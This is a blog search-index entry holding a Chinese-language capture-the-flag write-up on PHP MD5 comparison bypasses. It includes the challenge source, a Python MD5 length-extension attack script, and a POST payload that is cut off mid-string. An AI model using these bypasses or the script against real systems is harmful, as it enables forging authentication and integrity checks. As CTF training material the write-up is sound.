<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BaseCTF wp(week2)</title>
      <link href="/2024/09/11/BaseCTF-week2/"/>
      <url>/2024/09/11/BaseCTF-week2/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="所以说你很懂MD5"><a href="#所以说你很懂MD5" class="headerlink" title="所以说你很懂MD5"></a>所以说你很懂MD5</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 所以你说你懂 MD5 了?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;加强难度就不会了?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 什么? 你绕过去了?</span></span><br><span class="line"><span class="comment">// 加大剂量!</span></span><br><span class="line"><span class="comment">// 我要让他成为 string</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;难吗?不难!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你还是绕过去了?</span></span><br><span class="line"><span class="comment">// 哦哦哦, 我少了一个等于号</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你以为这就结束了</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你想看到 random 的值吗?</span></span><br><span class="line"><span class="comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>); <span class="comment">//题目给出hash值为66413c749dcb99fad13263f16a164bf2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不是管理员也来凑热闹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;伪造? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 认输了, 看样子你真的很懂 MD5</span></span><br><span class="line"><span class="comment">// 那 flag 就给你吧</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;看样子你真的很懂 MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>); 加强难度就不会了?</span><br></pre></td></tr></table></figure><p>apple与banana参数使用数组绕过</p><p>appple与bananana参数使用0e绕过</p><p>apppple与banananana参数使用md5碰撞绕过，借助fastcode工具生成两个md5相同的二进制文件，再用脚本将其转为url编码即可使用</p><p>下文补充上md5绕过知识点</p><p>接下来涉及新的知识点，先从代码分析开始</p><p>关键代码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;<span class="comment">//没有传参的话会将$name赋值为&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不是管理员也来凑热闹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;伪造? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.全局变量random有三个bin2hex(random_bytes(16))产生，也就是32*3&#x3D;96个字符：</p><p>​    bin2hex()是一个php函数，用于将二进制数据的字节转换成两位的16进制数，random_bytes(16)用于生成16字节的随机字节序列，两者配合使用会生成32位16进制字符串</p><p>2.if(substr($name, -5) !&#x3D;&#x3D; ‘admin’)判断name参数末尾五位是否为admin字符串</p><p>3.if(md5($random.$name) !&#x3D;&#x3D; $md5)具有明显哈希长度拓展攻击特征，用于检查攻击是否成功</p><p>md5长度拓展攻击原理见下面网址:</p><p><a href="https://luoingly.top/post/md5-length-extension-attack/">https://luoingly.top/post/md5-length-extension-attack/</a></p><p><a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><p><a href="https://delete.love/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/">https://delete.love/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</a></p><p>篇幅问题这里只记录工具用法（工具已注明出处）</p><p>本题使用工具:<a href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor, sin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">MD5 Extension Attack</span></span><br><span class="line"><span class="string">====================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@refs</span></span><br><span class="line"><span class="string">https://github.com/shellfeel/hash-ext-attack</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MD5</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D = \</span><br><span class="line">            (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)  <span class="comment"># initial values</span></span><br><span class="line">        <span class="variable language_">self</span>.r: <span class="built_in">list</span>[<span class="built_in">int</span>] = \</span><br><span class="line">            [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>] * <span class="number">4</span> + [<span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>] * <span class="number">4</span> + \</span><br><span class="line">            [<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>] * <span class="number">4</span> + [<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>] * <span class="number">4</span>  <span class="comment"># shift values</span></span><br><span class="line">        <span class="variable language_">self</span>.k: <span class="built_in">list</span>[<span class="built_in">int</span>] = \</span><br><span class="line">            [floor(<span class="built_in">abs</span>(sin(i + <span class="number">1</span>)) * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">             <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]  <span class="comment"># constants</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_lrot</span>(<span class="params">self, x: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># left rotate</span></span><br><span class="line">        <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="number">32</span> - n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, chunk: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># update the hash for a chunk of data (64 bytes)</span></span><br><span class="line">        w = <span class="built_in">list</span>(unpack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;I&#x27;</span>*<span class="number">16</span>, chunk))</span><br><span class="line">        a, b, c, d = <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                f = (b &amp; c) | ((~b) &amp; d)</span><br><span class="line">                flag = i</span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">                f = (b &amp; d) | (c &amp; (~d))</span><br><span class="line">                flag = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">                f = (b ^ c ^ d)</span><br><span class="line">                flag = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f = c ^ (b | (~d))</span><br><span class="line">                flag = (<span class="number">7</span> * i) % <span class="number">16</span></span><br><span class="line"></span><br><span class="line">            tmp = b + \</span><br><span class="line">                <span class="variable language_">self</span>._lrot((a + f + <span class="variable language_">self</span>.k[i] + w[flag])</span><br><span class="line">                           &amp; <span class="number">0xffffffff</span>, <span class="variable language_">self</span>.r[i])</span><br><span class="line">            a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.A = (<span class="variable language_">self</span>.A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.B = (<span class="variable language_">self</span>.B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.C = (<span class="variable language_">self</span>.C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.D = (<span class="variable language_">self</span>.D + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">self, msg: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># extend the hash with a new message (padded)</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(msg) % <span class="number">64</span> == <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">64</span>):</span><br><span class="line">            <span class="variable language_">self</span>.update(msg[i:i + <span class="number">64</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">self, msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># pad the message</span></span><br><span class="line">        length = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">len</span>(msg) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        msg += <span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line">        msg += <span class="string">b&#x27;\x00&#x27;</span> * ((<span class="number">56</span> - <span class="built_in">len</span>(msg)) % <span class="number">64</span>)</span><br><span class="line">        msg += length</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">digest</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return the hash</span></span><br><span class="line">        <span class="keyword">return</span> pack(<span class="string">&#x27;&lt;IIII&#x27;</span>, <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_md5</span>(<span class="params">test_string: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># (DEBUG function) verify the MD5 implementation</span></span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> md5 <span class="keyword">as</span> md5_hashlib</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">md5_manual</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        md5 = MD5()</span><br><span class="line">        md5.extend(md5.padding(msg))</span><br><span class="line">        <span class="keyword">return</span> md5.digest()</span><br><span class="line"></span><br><span class="line">    manual_result = md5_manual(test_string).<span class="built_in">hex</span>()</span><br><span class="line">    hashlib_result = md5_hashlib(test_string).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> manual_result == hashlib_result, <span class="string">&quot;Test failed!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">message_len: <span class="built_in">int</span>, known_hash: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">           append_str: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    <span class="comment"># MD5 extension attack</span></span><br><span class="line">    md5 = MD5()</span><br><span class="line"></span><br><span class="line">    previous_text = md5.padding(<span class="string">b&quot;*&quot;</span> * message_len)</span><br><span class="line">    current_text = previous_text + append_str</span><br><span class="line"></span><br><span class="line">    md5.A, md5.B, md5.C, md5.D = unpack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="built_in">bytes</span>.fromhex(known_hash))</span><br><span class="line">    md5.extend(md5.padding(current_text)[<span class="built_in">len</span>(previous_text):])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> current_text[message_len:], md5.digest().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    message_len = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input known text length: &quot;</span>))</span><br><span class="line">    known_hash = <span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input known hash: &quot;</span>).strip()</span><br><span class="line">    append_text = <span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Attacking...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    extend_str, final_hash = attack(message_len, known_hash, append_text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">    <span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Extend text:&quot;</span>, extend_str)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))··</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Final hash:&quot;</span>, final_hash)</span><br></pre></td></tr></table></figure><p> 此工具需要几样参数：明文长度，已知明文hash值，末尾字符串</p><p>根据题目分析分别填入96,66413c749dcb99fad13263f16a164bf2,admin</p><p><img src="/2024/09/11/BaseCTF-week2/image-20240903134538164-17260236445962.png" alt="image-20240903134538164"></p><p>通过工具计算出name的值为Extend text字符串，新生成的拓展hash值为 Final hash</p><p>payload（post提交）</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple[]=<span class="number">1</span>&amp;banana[]=<span class="number">2</span>&amp;appple=0e215962017&amp;bananana=s214587387a&amp;apppple=<span class="meta">%EC</span><span class="meta">%877</span><span class="meta">%A6</span><span class="meta">%27TN</span><span class="meta">%AB</span><span class="meta">%A4p</span><span class="meta">%9C8J</span><span class="meta">%97y</span><span class="meta">%91</span><span class="meta">%15UQ</span><span class="meta">%D6</span><span class="meta">%7E</span><span class="meta">%A6</span><span class="meta">%BC</span><span class="meta">%C8</span><span class="meta">%26</span><span class="meta">%8Ez</span><span class="meta">%22q</span><span class="meta">%B1</span><span class="meta">%09</span><span class="meta">%C2</span><span class="meta">%DA</span><span class="meta">%D4</span><span class="meta">%04</span><span class="meta">%CEP</span><span class="meta">%B6</span><span class="meta">%CB</span><span class="meta">%1D</span><span class="meta">%EF</span><span class="meta">%0Fe</span><span class="meta">%3A</span><span class="meta">%BF</span><span class="meta">%23</span><span class="meta">%3AB</span><span class="meta">%A9</span><span class="meta">%1EJ</span><span class="meta">%60_</span><span class="meta">%D9V</span><span class="meta">%00</span><span class="meta">%0F</span><span class="meta">%C5</span><span class="meta">%8C</span><span class="meta">%CC</span><span class="meta">%24</span><span class="meta">%24</span><span class="meta">%8B4</span><span class="meta">%05</span><span class="meta">%FA</span><span class="meta">%0B</span><span class="meta">%C4</span><span class="meta">%CD</span><span class="meta">%00</span><span class="meta">%FF</span><span class="meta">%16uz</span><span class="meta">%CCy</span><span class="meta">%DA</span><span class="meta">%C7x</span><span class="meta">%B9</span><span class="meta">%B5</span><span class="meta">%B4</span><span class="meta">%05</span><span class="meta">%26</span><span class="meta">%BA</span><span class="meta">%C7r</span><span class="meta">%EB</span><span class="meta">%EA</span><span class="meta">%FC</span><span class="meta">%DC</span><span class="meta">%B5</span><span class="meta">%CFM</span><span class="meta">%FE</span><span class="meta">%CD</span><span class="meta">%91</span><span class="meta">%27</span><span class="meta">%BB</span><span class="meta">%EDc</span><span class="meta">%B4</span><span class="meta">%AF</span><span class="meta">%E6</span><span class="meta">%86</span><span class="meta">%9EQ</span><span class="meta">%AA</span><span class="meta">%89</span><span class="meta">%FC</span><span class="meta">%0D</span><span class="meta">%FC</span><span class="meta">%1E</span><span class="meta">%093</span><span class="meta">%B3</span><span class="meta">%8B</span><span class="meta">%BE</span><span class="meta">%C3</span><span class="meta">%99</span><span class="meta">%E5Y</span><span class="meta">%C7</span><span class="meta">%E8</span><span class="meta">%12QC</span><span class="meta">%9C</span>&amp;banananana=<span class="meta">%EC</span><span class="meta">%877</span><span class="meta">%A6</span><span class="meta">%27TN</span><span class="meta">%AB</span><span class="meta">%A4p</span><span class="meta">%9C8J</span><span class="meta">%97y</span><span class="meta">%91</span><span class="meta">%15UQV</span><span class="meta">%7E</span><span class="meta">%A6</span><span class="meta">%BC</span><span class="meta">%C8</span><span class="meta">%26</span><span class="meta">%8Ez</span><span class="meta">%22q</span><span class="meta">%B1</span><span class="meta">%09</span><span class="meta">%C2</span><span class="meta">%DA</span><span class="meta">%D4</span><span class="meta">%04</span><span class="meta">%CEP</span><span class="meta">%B6</span><span class="meta">%CB</span><span class="meta">%1D</span><span class="meta">%EF</span><span class="meta">%0Fe</span><span class="meta">%3A</span><span class="meta">%BF</span><span class="meta">%A39B</span><span class="meta">%A9</span><span class="meta">%1EJ</span><span class="meta">%60_</span><span class="meta">%D9V</span><span class="meta">%00</span><span class="meta">%0F</span><span class="meta">%C5</span><span class="meta">%8CL</span><span class="meta">%24</span><span class="meta">%24</span><span class="meta">%8B4</span><span class="meta">%05</span><span class="meta">%FA</span><span class="meta">%0B</span><span class="meta">%C4</span><span class="meta">%CD</span><span class="meta">%00</span><span class="meta">%FF</span><span class="meta">%16uz</span><span class="meta">%CCy</span><span class="meta">%DA</span><span class="meta">%C7x</span><span class="meta">%B9</span><span class="meta">%B5</span><span class="meta">%B4</span><span class="meta">%05</span><span class="meta">%A6</span><span class="meta">%BA</span><span class="meta">%C7r</span><span class="meta">%EB</span><span class="meta">%EA</span><span class="meta">%FC</span><span class="meta">%DC</span><span class="meta">%B5</span><span class="meta">%CFM</span><span class="meta">%FE</span><span class="meta">%CD</span><span class="meta">%91</span><span class="meta">%27</span><span class="meta">%BB</span><span class="meta">%EDc</span><span class="meta">%B4</span><span class="meta">%AF</span><span class="meta">%E6</span><span class="meta">%86</span><span class="meta">%9EQ</span><span class="meta">%AA</span><span class="meta">%89</span><span class="meta">%7C</span><span class="meta">%0E</span><span class="meta">%FC</span><span class="meta">%1E</span><span 